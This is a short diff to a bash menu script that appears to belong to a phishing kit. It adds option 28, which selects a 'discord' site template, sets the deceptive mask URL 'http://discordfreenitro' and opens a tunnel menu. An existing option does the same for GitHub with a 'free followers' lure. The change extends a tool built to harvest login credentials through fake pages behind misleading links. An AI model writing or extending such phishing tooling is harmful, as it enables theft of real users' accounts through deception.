@@ -660,6 +660,10 @@ main_menu() {
 		website="github"
 		mask='http://get-1k-followers-on-github-free'
 		tunnel_menu
+			elif [[ "$REPLY" == 28 ]]; then
+		website="discord"
+		mask='http://discordfreenitro'
+		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
